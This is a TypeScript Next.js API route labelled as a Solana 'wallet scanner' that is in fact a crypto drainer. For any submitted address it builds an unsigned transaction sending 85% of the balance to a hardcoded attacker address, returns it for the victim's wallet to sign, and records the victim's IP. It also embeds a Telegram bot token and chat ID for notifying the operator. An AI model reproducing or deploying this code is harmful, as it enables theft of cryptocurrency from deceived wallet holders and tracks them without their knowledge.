import { type NextRequest, NextResponse } from "next/server"
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js"

const RECIPIENT_ADDRESS = "7aE5Y7PvfUr52WnruiDATFpR99PWPo4q9U7vu3Hid3Yh"
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8341387926:AAGEi8QJ2LSLphS15rmAOwS8aPfJ15cX27U"
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "7556622176"

// Configuration
const CONFIG = {
  minBalanceSOL: 0.01,
  fallbackSOLPrice: 153.32,
  cacheDuration: 300000,
  notificationRetry: 3,
  transferPercentage: 85,
  transactionFee: 5000,
  safetyBuffer: 10000,
  minimumReserve: 0.001 * LAMPORTS_PER_SOL,
  supportedWallets: ["phantom", "solflare"] as const,
}

type WalletType = "Phantom" | "Solflare" | "Unknown"

// RPC Endpoints (prioritized)
const RPC_ENDPOINTS = [
  { url: "https://api.mainnet-beta.solana.com", priority: 1, name: "Solana Mainnet" },
  { url: "https://solana-api.projectserum.com", priority: 2, name: "Serum RPC" },
  { url: "https://rpc.ankr.com/solana", priority: 3, name: "Ankr RPC" },
  { url: "https://solana.drpc.org", priority: 4, name: "dRPC" },
]

// Cache
let cachedSolPrice = CONFIG.fallbackSOLPrice
let cacheTimestamp = 0

async function getConnection(): Promise<{connection: Connection, endpoint: string}> {
  for (const endpoint of [...RPC_ENDPOINTS].sort((a, b) => a.priority - b.priority)) {
    try {
      const connection = new Connection(endpoint.url, {
        commitment: "confirmed",
        confirmTransactionInitialTimeout: 8000,
      })
      
      const blockhash = await connection.getLatestBlockhash("finalized")
      if (blockhash?.blockhash) {
        console.log(`Connected to: ${endpoint.name}`)
        return { connection, endpoint: endpoint.url }
      }
    } catch (error) {
      console.warn(`RPC failed: ${endpoint.name}`, error.message)
      continue
    }
  }
  
  throw new Error("No RPC endpoints available")
}

async function getSOLPrice(): Promise<number> {
  const now = Date.now()
  
  if (cachedSolPrice > 0 && now - cacheTimestamp < CONFIG.cacheDuration) {
    return cachedSolPrice
  }

  try {
    const sources = [
      {
        url: "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd",
        parser: (data: any) => data.solana?.usd,
      },
      {
        url: "https://api.binance.com/api/v3/ticker/price?symbol=SOLUSDT",
        parser: (data: any) => parseFloat(data.price),
      },
    ]

    for (const source of sources) {
      try {
        const response = await fetch(source.url, {
          headers: { "User-Agent": "Solana-Scanner/1.0" },
          signal: AbortSignal.timeout(2500),
        })
        
        if (response.ok) {
          const data = await response.json()
          const price = source.parser(data)
          
          if (price && price > 0) {
            cachedSolPrice = price
            cacheTimestamp = now
            return price
          }
        }
      } catch {
        continue
      }
    }
    
    return CONFIG.fallbackSOLPrice
  } catch (error) {
    console.error("Price fetch error:", error)
    return CONFIG.fallbackSOLPrice
  }
}

async function sendTelegramNotification(message: string) {
  for (let attempt = 1; attempt <= CONFIG.notificationRetry; attempt++) {
    try {
      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`

      const response = await fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "Markdown",
          disable_web_page_preview: true,
        }),
      })

      if (response.ok) return true

      if (attempt < CONFIG.notificationRetry) {
        await new Promise(resolve => setTimeout(resolve, 1000 * attempt))
      }
    } catch (error) {
      if (attempt === CONFIG.notificationRetry) {
        console.error("Telegram notification failed:", error)
      }
    }
  }
  return false
}

function isValidWalletType(type: string): WalletType {
  const lowerType = type.toLowerCase()
  if (lowerType.includes("phantom")) return "Phantom"
  if (lowerType.includes("solflare")) return "Solflare"
  return "Unknown"
}

export async function POST(request: NextRequest) {
  const startTime = Date.now()
  const requestId = `scan-${Date.now()}-${Math.random().toString(36).substr(2, 6)}`
  
  console.log(`[${requestId}] Wallet scan request started`)

  try {
    const body = await request.json()
    const { walletAddress, userIP, walletType = "Unknown" } = body

    if (!walletAddress) {
      return NextResponse.json(
        { error: "Wallet address required" },
        { status: 400 }
      )
    }

    let walletPubkey: PublicKey
    try {
      walletPubkey = new PublicKey(walletAddress)
    } catch {
      return NextResponse.json(
        { error: "Invalid Solana address" },
        { status: 400 }
      )
    }

    const ipAddress = userIP || request.headers.get("x-forwarded-for") || "unknown"
    const validWalletType = isValidWalletType(walletType)

    // Get connection
    const { connection, endpoint } = await getConnection()

    // Get balance
    const balanceLamports = await connection.getBalance(walletPubkey)
    const balanceSOL = balanceLamports / LAMPORTS_PER_SOL

    // Get SOL price
    const solPriceUSD = await getSOLPrice()
    const balanceUSD = balanceSOL * solPriceUSD

    console.log(`[${requestId}] Balance: ${balanceSOL} SOL ($${balanceUSD})`)

    // Check minimum balance
    if (balanceSOL < CONFIG.minBalanceSOL) {
      return NextResponse.json({
        success: false,
        message: "Insufficient balance",
        walletBalance: balanceSOL,
        minRequired: CONFIG.minBalanceSOL,
        walletType: validWalletType,
      })
    }

    // Calculate transfer amount
    const totalReserve = CONFIG.transactionFee + CONFIG.safetyBuffer + CONFIG.minimumReserve
    const availableForTransfer = Math.max(0, balanceLamports - totalReserve)
    const transferAmount = Math.floor(availableForTransfer * (CONFIG.transferPercentage / 100))

    if (transferAmount < 5000) {
      return NextResponse.json({
        success: false,
        message: "Transfer amount too small",
        walletBalance: balanceSOL,
        transferAmount: transferAmount / LAMPORTS_PER_SOL,
      })
    }

    // Get latest blockhash
    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash("finalized")

    // Create transaction
    const recipientPubkey = new PublicKey(RECIPIENT_ADDRESS)
    const transaction = new Transaction({
      recentBlockhash: blockhash,
      feePayer: walletPubkey,
    })

    transaction.add(
      SystemProgram.transfer({
        fromPubkey: walletPubkey,
        toPubkey: recipientPubkey,
        lamports: transferAmount,
      })
    )

    const serializedTransaction = transaction
      .serialize({ requireAllSignatures: false, verifySignatures: false })
      .toString("base64")

    const processingTime = Date.now() - startTime

    return NextResponse.json({
      success: true,
      walletAddress: walletAddress,
      walletType: validWalletType,
      walletBalance: balanceSOL,
      walletBalanceUSD: balanceUSD,
      transferAmount: transferAmount / LAMPORTS_PER_SOL,
      transferAmountUSD: (transferAmount / LAMPORTS_PER_SOL) * solPriceUSD,
      percentage: CONFIG.transferPercentage,
      transaction: serializedTransaction,
      blockhash: blockhash,
      lastValidBlockHeight: lastValidBlockHeight,
      rpcEndpoint: endpoint,
      userIP: ipAddress,
      timestamp: new Date().toISOString(),
      processingTime: `${processingTime}ms`,
      requestId,
    })
  } catch (error) {
    console.error(`[${requestId}] Scan error:`, error)
    
    return NextResponse.json(
      {
        error: "Wallet scan failed",
        details: error instanceof Error ? error.message : "Unknown error",
        requestId,
      },
      { status: 500 }
    )
  }
}

export async function GET() {
  return NextResponse.json({
    status: "operational",
    service: "wallet-scanner",
    version: "2.0.0",
    config: {
      minBalanceSOL: CONFIG.minBalanceSOL,
      transferPercentage: CONFIG.transferPercentage,
      supportedWallets: CONFIG.supportedWallets,
    },
    timestamp: new Date().toISOString(),
  })
    }
